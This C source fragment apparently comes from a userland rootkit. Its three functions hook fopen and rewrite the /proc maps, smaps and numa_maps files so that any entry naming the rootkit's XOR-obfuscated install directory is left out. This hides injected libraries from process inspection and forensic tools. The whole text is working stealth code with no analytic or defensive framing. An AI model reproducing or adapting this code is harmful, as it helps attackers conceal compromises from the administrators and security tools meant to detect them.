FILE *forge_maps(const char *pathname)
{
    HOOK(o_fopen, CFOPEN);

    char buf[PATH_MAX];
    FILE *o=tmpfile(), *pnt;
    if((pnt = o_fopen(pathname, "r")) == NULL) { errno = ENOENT; return NULL; }

    char *idir=strdup(IDIR); xor(idir);
    while(fgets(buf, sizeof(buf), pnt) != NULL) if(!strstr(buf, idir)) fputs(buf, o);
    CLEAN(idir);
    fclose(pnt);
    fseek(o,0,SEEK_SET);
    return o;
}

FILE *forge_smaps(const char *pathname)
{
    HOOK(o_fopen, CFOPEN);

    char buf[PATH_MAX]; int i=0;
    FILE *o=tmpfile(), *pnt;
    if((pnt=o_fopen(pathname, "r")) == NULL) { errno = ENOENT; return NULL; }

    char *idir=strdup(IDIR); xor(idir);
    while(fgets(buf, sizeof(buf), pnt) != NULL)
    {
        if(i>0) i++;
        if(i>15) i=0;
        if(strstr(buf, idir)) i=1;
        if(i==0) fputs(buf,o);
    }
    CLEAN(idir);
    fclose(pnt);
    fseek(o,0,SEEK_SET);
    return o;
}

FILE *forge_numamaps(const char *pathname)
{
    HOOK(o_fopen, CFOPEN);

    char buf[PATH_MAX];
    FILE *o=tmpfile(), *pnt;
    if((pnt=o_fopen(pathname, "r")) == NULL) { errno = ENOENT; return NULL; }

    char *idir=strdup(IDIR); xor(idir);
    while(fgets(buf, sizeof(buf), pnt) != NULL)
    {
        char addr[128], type[64], location[PATH_MAX];
        sscanf(buf, "%s %s %s", addr, type, location);
        if(!strncmp(location, "file=", strlen("file="))) if(!strstr(location, idir)) fputs(buf,o);
    }
    CLEAN(idir);
    fclose(pnt);
    fseek(o,0,SEEK_SET);
    return o;
}
